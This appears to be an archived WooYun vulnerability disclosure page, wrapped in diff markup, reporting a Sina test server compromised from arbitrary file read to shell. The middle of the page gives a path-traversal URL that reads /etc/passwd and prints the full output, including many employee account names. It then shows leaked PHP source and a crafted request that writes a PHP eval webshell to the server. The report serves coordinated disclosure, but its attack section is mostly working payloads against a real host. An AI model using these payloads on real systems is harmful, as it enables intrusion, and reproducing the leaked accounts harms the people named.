+				$("#attend_action").html('<a class="btn" href="javascript:void(0)" onclick="AttendBug('+id+')">'+_LANGJS.ATTENTION_BUG+'</a></span>');
+			}else{
+				alert(_LANGJS.FAIL_MANAGE);
+			}
+		});
+	}
+}
+
+function CollectBug(id,token){
+	$.get('/ajaxdo.php',{'module':'collect','id':id,'token':token,'rid':Math.random()},function(re){
+		if(re==1){
+			$("#collection_num").html(parseInt($("#collection_num").html())+1);
+			$(".btn-fav").removeClass("fav-add");
+			$(".btn-fav").addClass("fav-cancel");
+			$(".btn-fav").unbind();
+			$(".btn-fav").click(function(){
+					CollectCancel(id,token);
+				});
+		}else if(re==2){
+			alert(_LANGJS.LOGIN_FIRST);
+		}else if(re==3){
+			alert(_LANGJS.COLLECTION_BUG_DONE);
+		}else{
+			alert(_LANGJS.FAIL_MANAGE);
+		}
+	});
+}
+function CollectCancel(id,token){
+	if(confirm(_LANGJS.COLLECTION_BUG_CONFIRM+"?")){
+		$.get('/ajaxdo.php',{'module':'collectcancel','id':id,'token':token,'rid':Math.random()},function(re){
+			if(re==1){
+				$("#collection_num").html(parseInt($("#collection_num").html())-1);
+				$(".btn-fav").removeClass("fav-cancel");
+				$(".btn-fav").addClass("fav-add");
+				$(".btn-fav").unbind();
+				$(".btn-fav").click(function(){
+					CollectBug(id,token);
+				});
+			}else{
+				alert(_LANGJS.FAIL_MANAGE);
+			}
+		});
+	}
+}
+</script>
+
+	<div class="content">
+<input type="hidden" id="token" style="display:none" value="" />
+		<h2>漏洞概要
+						<span style="margin:0 0 0 580px; float:right; position:absolute; font-size:14px; font-weight:normal">关注数(<span id="attention_num">33</span>)
+		 <span id="attend_action">
+		 		 <a class="btn" href="javascript:void(0)" onclick="AttendBug(91301)">关注此漏洞</a></span>
+		 		 </span></h2>
+
+		<h3>缺陷编号：		<a href="wooyun-2015-091301">WooYun-2015-91301</a>
+			<input id="fbid" type="hidden" value="91301">
+					</h3>
+
+		<h3 class='wybug_title'>漏洞标题：		Sina某站从任意文件读取到GetShell  					</h3>
+
+		<h3 class='wybug_corp'>相关厂商：		<a href="http://www.wooyun.org/corps/新浪">
+														新浪														</a>
+		</h3>
+
+		<h3 class='wybug_author'>漏洞作者：		<a href="http://www.wooyun.org/whitehats/boooooom">boooooom</a><img height="12" width="12" style="vertical-align:-2px;margin-left:2px;" src="http://wooyun.org/images/v.png" alt="认证白帽子" /></h3>
+		<h3 class='wybug_date'>提交时间：		2015-01-12 09:34</h3>
+				<h3 class='wybug_open_date'>公开时间：		2015-02-26 09:36</h3>
+		<h3 class='wybug_type'>漏洞类型：		文件上传导致任意代码执行</h3>
+
+		<h3 class='wybug_level'>危害等级：		高</h3>
+				<h3>自评Rank：		20</h3>
+				<h3 class='wybug_status'>漏洞状态：
+															厂商已经确认
+																</h3>
+
+		<h3>漏洞来源：		<a href="http://www.wooyun.org">http://www.wooyun.org</a>，如有疑问或需要帮助请联系 help@wooyun.org</h3>
+		<h3>Tags标签：
+												<span class="tag"><a href="http://wooyun.org/tags/webshell">webshell</a></span>
+							<span class="tag"><a href="http://wooyun.org/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">任意文件上传</a></span>
+							<span class="tag"><a href="http://wooyun.org/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">任意文件上传</a></span>
+							<span class="tag"><a href="http://wooyun.org/tags/webshell">webshell</a></span>
+							<span class="tag"><a href="http://wooyun.org/tags/webshell">webshell</a></span>
+								
+</h3>
+		<h3>
+		<!-- Baidu Button BEGIN -->
+        <div id="share">
+        	<div style="float:right; margin-right:100px;font-size:12px">
+            <span class="fav-num"><a id="collection_num">6</a>人收藏</span>
+			<a style="text-decoration:none; font-size:12px" href="javascript:void(0)" class="fav-add btn-fav">收藏</a>
+<script type="text/javascript">
+var token="";
+var id="91301";
+
+$(".btn-fav").click(function(){ CollectBug(id,token); });
+
+</script>
+			</div>
+            <span style="float:left;">分享漏洞：</span>
+            <div id="bdshare" class="bdshare_b" style="line-height: 12px;"><img src="http://bdimg.share.baidu.com/static/images/type-button-5.jpg" />
+                <a class="shareCount"></a>
+            </div>
+        </div>
+        <!-- Baidu Button END -->
+    	</h3>
+		<hr align="center"/>
+
+		<h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail wybug_open_status">
+									2015-01-12：	细节已通知厂商并且等待厂商处理中<br/>
+									2015-01-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2015-01-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2015-02-01：	细节向普通白帽子公开<br/>
+									2015-02-11：	细节向实习白帽子公开<br/>
+									2015-02-26：	细节向公众公开<br/>
+								</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail wybug_description">RT</p>
+
+		
+						<h3 class="detailTitle">详细说明：</h3>
+    <div class='wybug_detail'>
+			<p class="detail">首先从一个看似很蛋疼的页面开始说起<br />
+<br />
+http://123.125.106.97/test/data.php 这是个啥？<br />
+<br />
+</p><p class="detail usemasaic"><a href="../upload/201501/11235016911e8b90de91ccb1ece8eafad1d182ce.jpg" target="_blank"><img src="../upload/201501/11235016911e8b90de91ccb1ece8eafad1d182ce.jpg" alt="1.jpg" width="600" onerror="javascript:errimg(this);"/></a></p><p class="detail"><br />
+<br />
+嗯，他教我要传入两个参数。<br />
+<br />
+</p><fieldset class='fieldset fieldset-code'><legend>code 区域</legend><pre><code>please input &#039;date=&amp;type=&#039;</code></pre></fieldset><p class='detail'><br />
+<br />
+随便传入两个值发现是下载xls，经验告诉我，date这个参数很有可能是拼接然后读文件，于是有了<br />
+<br />
+</p><fieldset class='fieldset fieldset-code'><legend>code 区域</legend><pre><code>http://123.125.106.97/test/data.php?date=../../../../../../../../../../../../../../../../etc/passwd%00&amp;type=../../../../../../../../../../../../../../../../etc/passwd%00</code></pre></fieldset><p class='detail'><br />
+<br />
+果然是读文件<br />
+<br />
+</p><fieldset class='fieldset fieldset-code'><legend>code 区域</legend><pre><code>root:x:0:0:root:/root:/bin/bash<br />
+bin:x:1:1:bin:/bin:/sbin/nologin<br />
+daemon:x:2:2:daemon:/sbin:/sbin/nologin<br />
+adm:x:3:4:adm:/var/adm:/sbin/nologin<br />
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br />
+sync:x:5:0:sync:/sbin:/bin/sync<br />
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br />
+halt:x:7:0:halt:/sbin:/sbin/halt<br />
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br />
+news:x:9:13:news:/etc/news:<br />
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin<br />
+operator:x:11:0:operator:/root:/sbin/nologin<br />
+games:x:12:100:games:/usr/games:/sbin/nologin<br />
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin<br />
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br />
+nobody:x:99:99:Nobody:/:/sbin/nologin<br />
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin<br />
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin<br />
+pcap:x:77:77::/var/arpwatch:/sbin/nologin<br />
+oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin<br />
+ntp:x:38:38::/etc/ntp:/sbin/nologin<br />
+sysmon:x:60422:60422::/nonexistent:/nologin<br />
+sshd:x:500:500::/home/sshd:/sbin/nologin<br />
+dbus:x:81:81:System message bus:/:/sbin/nologin<br />
+avahi:x:70:70:Avahi daemon:/:/sbin/nologin<br />
+rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin<br />
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin<br />
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin<br />
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin<br />
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin<br />
+nfsnobody:x:4294967294:4294967294:Anonymous NFS User:/var/lib/nfs:/sbin/nologin<br />
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin<br />
+avahi-autoipd:x:100:104:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin<br />
+sabayon:x:86:86:Sabayon user:/home/sabayon:/sbin/nologin<br />
+libin1:x:502:502::/usr/home/libin1:/bin/bash<br />
+junhai:x:503:503::/usr/home/junhai:/bin/bash<br />
+qingming:x:504:504::/usr/home/qingming:/bin/bash<br />
+liyuan:x:505:505::/usr/home/liyuan:/bin/bash<br />
+hangang:x:507:507::/usr/home/hangang:/bin/bash<br />
+wangshuo:x:508:508::/usr/home/wangshuo:/bin/bash<br />
+genlei:x:509:509::/usr/home/genlei:/bin/bash<br />
+xiaoyue1:x:514:514::/usr/home/xiaoyue1:/bin/bash<br />
+pengjie:x:520:520::/usr/home/pengjie:/bin/bash<br />
+taohui:x:528:528::/usr/home/taohui:/bin/bash<br />
+yuli3:x:533:533::/usr/home/yuli3:/bin/bash<br />
+search:x:536:536::/usr/home/search:/sbin/nologin<br />
+xueyun:x:537:537::/usr/home/xueyun:/bin/bash<br />
+jianqing:x:540:540::/usr/home/jianqing:/bin/bash<br />
+hongwei6:x:542:542::/usr/home/hongwei6:/bin/bash<br />
+wuhua1:x:543:543::/usr/home/wuhua1:/bin/bash<br />
+mysql:x:545:545::/usr/home/mysql:/sbin/nologin<br />
+xiaolong:x:547:547::/usr/home/xiaolong:/bin/bash<br />
+qixing:x:548:548::/usr/home/qixing:/bin/bash<br />
+liuxin4:x:549:549::/usr/home/liuxin4:/bin/bash<br />
+zhuhuan:x:550:550::/usr/home/zhuhuan:/bin/bash<br />
+zhongqin:x:551:551::/usr/home/zhongqin:/bin/bash<br />
+leilei3:x:552:552::/usr/home/leilei3:/bin/bash<br />
+yajun:x:554:554::/usr/home/yajun:/bin/bash<br />
+dalong1:x:556:556::/usr/home/dalong1:/bin/bash<br />
+kaijun1:x:557:557::/usr/home/kaijun1:/bin/bash<br />
+zhenqiang1:x:561:561::/usr/home/zhenqiang1:/bin/bash<br />
+jinqiang:x:565:565::/usr/home/jinqiang:/bin/bash<br />
+rdsup_api:x:567:567::/usr/home/rdsup_api:/bin/bash<br />
+chenyang:x:568:568::/usr/home/chenyang:/bin/bash<br />
+shukui1:x:569:569::/usr/home/shukui1:/bin/bash<br />
+bangjian:x:572:572::/usr/home/bangjian:/bin/bash<br />
+kaiwei3:x:574:574::/usr/home/kaiwei3:/bin/bash<br />
+maqian:x:576:576::/usr/home/maqian:/bin/bash<br />
+guochao3:x:578:578::/usr/home/guochao3:/bin/bash<br />
+xiaofeng6:x:580:580::/usr/home/xiaofeng6:/bin/bash<br />
+xiaodong2:x:581:581::/usr/home/xiaodong2:/bin/bash<br />
+wb_liukai:x:582:582::/usr/home/wb_liukai:/bin/bash<br />
+wb_guorui:x:583:583::/usr/home/wb_guorui:/bin/bash<br />
+wb_zhuoyue:x:584:584::/usr/home/wb_zhuoyue:/bin/bash<br />
+hean:x:585:585::/usr/home/hean:/bin/bash<br />
+zhuxing:x:588:588::/usr/home/zhuxing:/bin/bash<br />
+xingdong:x:589:589::/usr/home/xingdong:/bin/bash<br />
+puppet:x:52:52:Puppet:/var/lib/puppet:/sbin/nologin<br />
+hongkai1:x:590:590::/usr/home/hongkai1:/bin/bash<br />
+baohua:x:591:591::/usr/home/baohua:/bin/bash<br />
+tangkai:x:592:592::/usr/home/tangkai:/bin/bash</code></pre></fieldset><p class='detail'><br />
+<br />
+然后，然后猜路径读php源代码啊，嗯，猜到了<br />
+<br />
+</p><fieldset class='fieldset fieldset-code'><legend>code 区域</legend><pre><code>http://123.125.106.97/test/data.php?date=../../../../test/data.php%00&amp;type=1<br />
+关键是这个文件<br />
+../../../../test/tmpls.php</code></pre></fieldset><p class='detail'><br />
+<br />
+159-163行<br />
+<br />
+</p><fieldset class='fieldset fieldset-code'><legend>code 区域</legend><pre><code>...			}else if($mod == &#039;tmpsave&#039;){<br />
+				$data = $_REQUEST[&#039;data&#039;];<br />
+				saveTmpl($filename, $data, $url);<br />
+				return;<br />
+			}else if($mod == &#039;down&#039;){<br />
+...</code></pre></fieldset><p class='detail'><br />
+<br />
+saveTmpl可疑的函数，8成屎写文件的，继续下代码看，头部include了一个文件require_once(&#039;include/tmpl_func.php&#039;);<br />
+<br />
+</p><fieldset class='fieldset fieldset-code'><legend>code 区域</legend><pre><code>&lt;?php<br />
+	require_once(&quot;Settings.php&quot;);<br />
+if(!extension_loaded(&quot;curl&quot;))@dl(&quot;curl.so&quot;);<br />
+	function crawl($url){<br />
+                $request = curl_init();<br />
+                if (!$request) {<br />
+                        return -1;<br />
+                }<br />
+                if (!curl_setopt($request, CURLOPT_URL, $url)) {<br />
+                        return -2;<br />
+                }<br />
+                if (!curl_setopt($request, CURLOPT_RETURNTRANSFER, true)){<br />
+                        return -3;<br />
+                }<br />
+                if (!curl_setopt($request, CURLOPT_TIMEOUT, 15)){<br />
+                        return -4;<br />
+                }<br />
+                if (!curl_setopt($request, CURLOPT_ENCODING, &#039;gzip,deflate&#039;)){<br />
+                        return -5;<br />
+                }<br />
+                if (!curl_setopt($request, CURLOPT_USERAGENT, &#039;SinaWeiboBot&#039;)) {<br />
+                        return -6;<br />
+                }<br />
+                $response = curl_exec($request);<br />
+                if (!$response) {<br />
+                        return -7;<br />
+                }<br />
+                return $response;<br />
+        }<br />
+	/*<br />
+	*页面编码纠正<br />
+	*/	<br />
+	function judgeCharset($html){<br />
+		$head = $html-&gt;find(&#039;head&#039;);<br />
+		$head = current($head);<br />
+		$meta = $head-&gt;find(&#039;meta&#039;);<br />
+		for($i=0; $i&lt;count($meta);$i++){<br />
+			$one = $meta[$i];<br />
+			//content=&quot;text/html; charset=utf-8&quot;<br />
+			$charset = strtolower($one-&gt;getAttribute(&#039;content&#039;));<br />
+			list($type, $code) = explode(&quot;;&quot;, $charset);<br />
+			echo $charset;<br />
+			if(strpos($code, &quot;utf-8&quot;) &gt;0 || strpos($code, &quot;utf8&quot;) &gt;0){<br />
+				$one-&gt;setAttribute(&#039;content&#039;, &quot;text/html; charset=gbk&quot;);<br />
+				return true;	<br />
+			}<br />
+		}<br />
+		return false;<br />
+	}<br />
+	function getUrlContent(&amp;$url){	<br />
+		$content = crawl($url);<br />
+                if(strpos($content, &#039;&lt;/head&gt;&#039;) === false){<br />
+                        $content = str_replace(&#039;&lt;body&gt;&#039;, &#039;&lt;/head&gt;&lt;body&gt;&#039;, $content);<br />
+		}<br />
+		if(is_utf8($content)) return &quot;utf8&quot;;<br />
+		else return &quot;gbk&quot;;<br />
+		/*<br />
+		if(IsUTF8($content)){<br />
+                        $content = iconv(&#039;utf-8&#039;, &#039;gbk//ignore&#039;, $content);<br />
+			$arr = array(&quot;charset=utf-8&quot; =&gt; &quot;charset=gbk&quot;);<br />
+			$content = strtr($content,$arr);<br />
+		}<br />
+		*/<br />
+                return $content;	<br />
+	}<br />
+	/**<br />
+	 * 取得网页内容<br />
+	 *<br />
+	 * @param string $url<br />
+	 * @return string<br />
+	 */<br />
+	function getUrlContent2(&amp;$url){<br />
+		$http = array(&#039;http&#039;=&gt;array(&#039;method&#039;=&gt;&#039;GET&#039;, &#039;timeout&#039;=&gt;1, &#039;user_agent&#039;=&gt;&quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 QQDownload/1.7&quot;, &#039;header&#039;=&gt;&quot;Accept-Language: zh-cn,zh;q=0.5&quot;));<br />
+		$content = @file_get_contents($url, false, stream_context_create($http));<br />
+		if(strpos($http_response_header[0], &#039;404&#039;) !== false)return false;<br />
+		if(!$content){<br />
+			$ch = curl_init();<br />
+			curl_setopt($ch, CURLOPT_URL, $url);<br />
+			curl_setopt($ch, CURLOPT_HEADER, 0);<br />
+			curl_setopt($ch, CURLOPT_HTTPHEADER, array(&quot;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 QQDownload/1.7&quot;, &quot;Accept-Language: zh-cn,zh;q=0.5&quot;));<br />
+			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);<br />
+			$content = curl_exec($ch);<br />
+			curl_close($ch);<br />
+		}<br />
+		if(IsUTF8($content))<br />
+			$content = iconv(&#039;utf-8&#039;, &#039;gbk//ignore&#039;, $content);<br />
+		if(strpos($content, &#039;&lt;/head&gt;&#039;) === false)<br />
+			$content = str_replace(&#039;&lt;body&gt;&#039;, &#039;&lt;/head&gt;&lt;body&gt;&#039;, $content);<br />
+		return $content;<br />
+	}<br />
+	/**<br />
+	*读取配置<br />
+	*<br />
+	*@param String $line<br />
+	*@return array() if is section ,return array(section), if is entry, return array(entry, value)<br />
+	*/<br />
+	function readConfig($line){<br />
+		$line = trim($line);<br />
+		//解析section	<br />
+		if(strpos($line, &#039;[&#039;) == 0 &amp;&amp; strrpos($line, &#039;]&#039;) == (strlen($line) - 1)){<br />
+			return array(substr($line, 1, strlen($line) - 2));<br />
+		}else{<br />
+			//解析value<br />
+                        $pos = strpos($line, &#039;=&#039;);<br />
+                        if($pos &gt; 0){<br />
+                                $entry = trim(substr($line, 0, $pos));<br />
+                                $value = trim(substr($line, $pos+1));<br />
+                                return array($entry, $value);<br />
+                        }<br />
+                }<br />
+                return array();<br />
+	}<br />
+	/**<br />
+	 * 读取模板配置文件<br />
+	 *<br />
+	 * @param String $filename<br />
+	 * @return Array<br />
+	 */<br />
+	function parseTmpl($filename){<br />
+		if(!file_exists($filename))return false;<br />
+		$tmpl = new Settings_INI();<br />
+		$ret = $tmpl-&gt;load($filename);<br />
+		/*<br />
+		$typeRet = array();<br />
+		foreach($ret as $section=&gt;$entrys){<br />
+			//如果是以special开头的，则提取后面的名字<br />
+			$key = substr($section, strlen(&quot;special-&quot;));<br />
+			foreach($entrys as $entry =&gt; $value){<br />
+				 if(strcmp($entry, &quot;GENERAL&quot;) == 0){<br />
+                                        $typeRet[$key][&#039;score&#039;] = $value;<br />
+                                }else if(strcmp($entry, &quot;WEIGHT&quot;) == 0){<br />
+                                        $typeRet[$key][&#039;weight&#039;] = $value;<br />
+                                }<br />
+                                else if(strcmp($entry, &quot;TEMPLATE&quot;) == 0){<br />
+                                        $typeRet[$key][&#039;tmpl&#039;] = $value;<br />
+                                }<br />
+			}<br />
+		}<br />
+		*/<br />
+		return $ret;<br />
+	}<br />
+	function parseTmpl2($filename){<br />
+		if(!file_exists($filename))return false;<br />
+		$content = file_get_contents($filename);<br />
+		$content = iconv(&#039;gbk&#039;, &#039;utf-8//ignore&#039;, $content);<br />
+		$lines = preg_split(&#039;/\r\n|\n|\r/&#039;, $content, -1, PREG_SPLIT_NO_EMPTY);<br />
+		$data = array();<br />
+		$count = count($lines);<br />
+		for($i = 0; $i &lt; $count; $i ++){<br />
+			$line = $lines[$i];<br />
+			if(strpos($line, &#039;:&#039;) === false)continue;<br />
+			list($key, $val) = explode(&#039;:&#039;, $line);<br />
+			if(strpos($key, &#039;#list&#039;) === 0){	//解析list<br />
+				$t = explode(&#039;|&#039;, $key);<br />
+				$name = $t[1];<br />
+				$path = $val;<br />
+				$data[&#039;list&#039;][$path][&#039;name&#039;] = $name;<br />
+				$line = $lines[++$i];<br />
+				while($i &lt; $count &amp;&amp; $line != &#039;#endlist&#039;){<br />
+					list($k, $v) = explode(&#039;:&#039;, $line);<br />
+					$data[&#039;list&#039;][$path][&#039;content&#039;][$k] = $v;<br />
+					$line = $lines[++$i];<br />
+				}<br />
+				if($i == $count)return false;	//没找到结束标签<br />
+			}else $data[$key] = $val;<br />
+		}<br />
+		return $data;<br />
+	}<br />
+	<br />
+	/**<br />
+	 * 保存模板到配置文件中<br />
+	 *<br />
+	 */<br />
+	function saveTmpl($filename, $data, $url, $flag = true){<br />
+		if($flag){<br />
+                	$array = json_decode($data, true);<br />
+		}else $array = $data;<br />
+                if(!$array)return false;<br />
+		//初始化common信息<br />
+		if(!$array[&#039;common&#039;]){<br />
+			$array[&#039;common&#039;][&#039;REGISTER_URL&#039;] = $url;<br />
+			$array[&#039;common&#039;][&#039;REGISTER_ID&#039;] = md5($url);<br />
+			$array[&#039;common&#039;][&#039;REGISTER_TOP&#039;] = 5;<br />
+		}else{<br />
+			if(!$array[&#039;common&#039;][&#039;REGISTER_URL&#039;]) $array[&#039;common&#039;][&#039;REGISTER_URL&#039;] = $url;<br />
+			if(!$array[&#039;common&#039;][&#039;REGISTER_ID&#039;]) $array[&#039;common&#039;][&#039;REGISTER_ID&#039;] = md5($url);<br />
+			if(!$array[&#039;common&#039;][&#039;REGISTER_TOP&#039;]) $array[&#039;common&#039;][&#039;REGISTER_TOP&#039;] = 5;<br />
+		}<br />
+		<br />
+		$fpFile =fopen($filename, &quot;w&quot;);<br />
+		if(!$fpFile) {<br />
+			echo &quot;write $filename error.&lt;br/&gt;&quot;;<br />
+			return false;<br />
+		}<br />
+		foreach($array as $section=&gt;$entrys){<br />
+			fprintf($fpFile,&quot;[%s]\n&quot;, $section);<br />
+			foreach($entrys as $entry=&gt;$value){<br />
+				fprintf($fpFile,&quot;%s = %s\n&quot;, $entry, $value);<br />
+			}<br />
+		}<br />
+		fclose($fpFile);<br />
+		return true;<br />
+	}<br />
+	/**检测站点模板是否存在<br />
+	**/<br />
+	function existed_tmpl($CONFIG, $site){<br />
+                $path = $CONFIG[&#039;tmpl&#039;][&#039;TEMPLATE_PATH&#039;];<br />
+                if(!file_exists($path)) return false;<br />
+                //看是否有该站点的模板<br />
+                //模板命名为$domain.$urlmd5.tmpl<br />
+                if(!preg_match(&#039;/http:\/\/([^\/]+)/&#039;, $site, $matches)) {<br />
+                        return false;<br />
+                }<br />
+                $domain = $matches[1];<br />
+                $urlmd5  = md5($site);<br />
+                $filename = &quot;$path/$domain.$urlmd5.tmpl&quot;;<br />
+                if(!file_exists($filename)) return false;<br />
+                return true;<br />
+	}<br />
+	function saveTmpl2($filename, $data){<br />
+		$array = json_decode($data, true);<br />
+		if(!$array)return false;<br />
+		$str = &quot;&quot;;<br />
+		foreach ($array as $key=&gt;$val){<br />
+			if($key == &#039;list&#039;)continue;<br />
+			$str .= &quot;$key:$val\r\n&quot;;<br />
+		}<br />
+		if(isset($array[&#039;list&#039;])){<br />
+			foreach ($array[&#039;list&#039;] as $key=&gt;$val){<br />
+				$s = &#039;&#039;;<br />
+				$name = $val[&#039;name&#039;];<br />
+				$val = $val[&#039;content&#039;];<br />
+				foreach ($val as $k=&gt;$v){<br />
+					$s .= &quot;$k:$v\r\n&quot;;<br />
+				}<br />
+				if(!empty($s))<br />
+					$str .= &quot;\r\n#list|$name:$key\r\n$s#endlist\r\n&quot;;<br />
+			}<br />
+		}<br />
+		$str = iconv(&#039;utf-8&#039;, &#039;gbk//ignore&#039;, $str);<br />
+		file_put_contents($filename, $str);<br />
+		return true;<br />
+	}<br />
+	/**<br />
+	*从生成的html节点下读取页面编码格式<br />
+	*/<br />
+	function getContentCode($html){<br />
+<br />
+	}<br />
+	/**<br />
+	 * 处理节点，给每一个有文字的节点添加onmouseover,onmouseout,onclick属性<br />
+	 *<br />
+	 * @param DOMNode $node<br />
+	 */<br />
+	function dealNode22($node){<br />
+		$length = count($node-&gt;nodes);<br />
+		//对每个节点移除所有的事件<br />
+		$node-&gt;removeAttribute(&quot;onmouseover&quot;);<br />
+		$node-&gt;removeAttribute(&quot;onmouseout&quot;);<br />
+		$node-&gt;removeAttribute(&quot;onclick&quot;);<br />
+		if($length == 0){<br />
+			$flag = false;<br />
+			if(trim($node-&gt;text()))<br />
+				$flag = true;<br />
+			else if($node-&gt;tag == &#039;img&#039;)<br />
+				$flag = true;<br />
+			if($flag){<br />
+				if($node-&gt;tag == &#039;text&#039;)<br />
+					$node = $node-&gt;parent();<br />
+				$excludeTags = array(&#039;text&#039;, &#039;script&#039;, &#039;style&#039;, &#039;head&#039;, &#039;body&#039;, &#039;iframe&#039;, &#039;input&#039;, &#039;select&#039;, &#039;textarea&#039;);<br />
+				if(!in_array($node-&gt;tag, $excludeTags)){<br />
+					$node-&gt;setAttribute(&#039;onmouseover&#039;, &quot;mouseover(event)&quot;);<br />
+					$node-&gt;setAttribute(&#039;onmouseout&#039;, &quot;mouseout(event)&quot;);<br />
+					$node-&gt;setAttribute(&#039;onclick&#039;, &#039;return mouseclick(event)&#039;);<br />
+				}<br />
+				if($node-&gt;tag == &#039;a&#039;){<br />
+					$node-&gt;setAttribute(&quot;href&quot;, &quot;javascript:void(0)&quot;);<br />
+					$node-&gt;setAttribute(&quot;target&quot;, &quot;_self&quot;);<br />
+				}<br />
+			}<br />
+		}else{<br />
+			foreach ($node-&gt;nodes as $n)<br />
+				dealNode22($n);<br />
+		}<br />
+	}<br />
+	function dealNode($node){<br />
+		$length = count($node-&gt;nodes);<br />
+		$flag = false;<br />
+		if(trim($node-&gt;text())) $flag = true;<br />
+		if($flag &amp;&amp; $length ==0 ){<br />
+			$excludeTags = array(&#039;text&#039;, &#039;script&#039;, &#039;style&#039;, &#039;head&#039;, &#039;body&#039;, &#039;iframe&#039;,<br />
+					     &#039;input&#039;, &#039;select&#039;,&#039;textarea&#039;);<br />
+			if($node-&gt;tag == &#039;text&#039; || $node-&gt;tag == &#039;img&#039;) $node = $node-&gt;parent();<br />
+			if(!in_array($node-&gt;tag, $excludeTags)){<br />
+				if($node-&gt;getAttribute(&#039;onmouseover&#039;) || $node-&gt;getAttribute(&#039;onclick&#039;)) return;<br />
+				$node-&gt;setAttribute(&#039;onmouseover&#039;, &quot;mouseover(event)&quot;);<br />
+				$node-&gt;setAttribute(&#039;onmouseout&#039;, &quot;mouseout(event)&quot;);<br />
+				$node-&gt;setAttribute(&#039;onclick&#039;, &#039;return mouseclick(event)&#039;);<br />
+			}<br />
+			if($node-&gt;tag == &#039;a&#039;){<br />
+				$node-&gt;setAttribute(&quot;href&quot;, &quot;javascript:void(0)&quot;);<br />
+				$node-&gt;setAttribute(&quot;target&quot;, &quot;_self&quot;);<br />
+			}<br />
+		}<br />
+		if($length != 0){<br />
+			foreach ($node-&gt;nodes as $n)<br />
+				dealNode($n);<br />
+		}<br />
+	}<br />
+	?&gt;</code></pre></fieldset><p class='detail'><br />
+<br />
+<br />
+<br />
+嗯，那么构造一个url传shell<br />
+<br />
+</p><fieldset class='fieldset fieldset-code'><legend>code 区域</legend><pre><code>http://123.125.106.97/test/tmpls.php?url=http://www.sina.php%00;123&amp;mod=tmpsave&amp;data={&quot;&lt;?php @eval($_POST[wy123]);?&gt;&quot;:123}&amp;common=1</code></pre></fieldset><p class='detail'><br />
+<br />
+上传成功：<br />
+<br />
+http://123.125.106.97/test/tmpls/www.sina.php<br />
+<br />
+ </p>
+    </div>
+						
+			<h3 class="detailTitle">漏洞证明：</h3>
+      <div class='wybug_poc'>
+			<p class="detail"></p><p class="detail usemasaic"><a href="../upload/201501/1200010170a18a72e116d4ff5088b0bd201492f7.jpg" target="_blank"><img src="../upload/201501/1200010170a18a72e116d4ff5088b0bd201492f7.jpg" alt="caidao.jpg" width="600" onerror="javascript:errimg(this);"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail usemasaic"><a href="../upload/201501/120001100520c2ba2561021fb3fd80d0b0f1bc5c.jpg" target="_blank"><img src="../upload/201501/120001100520c2ba2561021fb3fd80d0b0f1bc5c.jpg" alt="shell.jpg" width="600" onerror="javascript:errimg(this);"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail usemasaic"><a href="../upload/201501/12000158392cb318b7222b27d2f1af67a1d712cd.jpg" target="_blank"><img src="../upload/201501/12000158392cb318b7222b27d2f1af67a1d712cd.jpg" alt="2.jpg" width="600" onerror="javascript:errimg(this);"/></a></p><p class="detail"> </p>
+    </div>
+									<h3 class="detailTitle">修复方案：</h3>
+      <div class='wybug_patch'>
+			<p class="detail">罚钱，这个要 </p>
+    </div>
+													<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/boooooom" title="boooooom">boooooom</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-091301" title="Sina某站从任意文件读取到GetShell">乌云</a></h3>
+		<hr align="center"/>
+
+		
+			<h2 id="bugreply">漏洞回应</h2>
+      <div class='bug_result'>
+			
+				
+				
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2015-01-12 11:03</p>
+												<h3 class="detailTitle">厂商回复：</h3>
+						<p class="detail">感谢关注新浪安全，漏洞修复中。</p>
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+				      </div>
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="91301";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
